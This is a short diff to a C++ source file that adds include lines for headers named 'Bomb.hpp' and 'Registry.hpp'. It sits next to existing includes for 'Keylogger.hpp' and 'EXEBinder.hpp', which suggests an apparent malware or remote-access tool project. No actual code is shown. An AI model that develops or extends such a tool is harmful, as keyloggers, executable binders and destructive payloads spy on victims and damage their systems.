@@ -10,3 +10,5 @@
 #include "Keylogger.hpp"
 #include "Miscellaneous.hpp"
 #include "EXEBinder.hpp"
+#include "Bomb.hpp"
+#include "Registry.hpp"
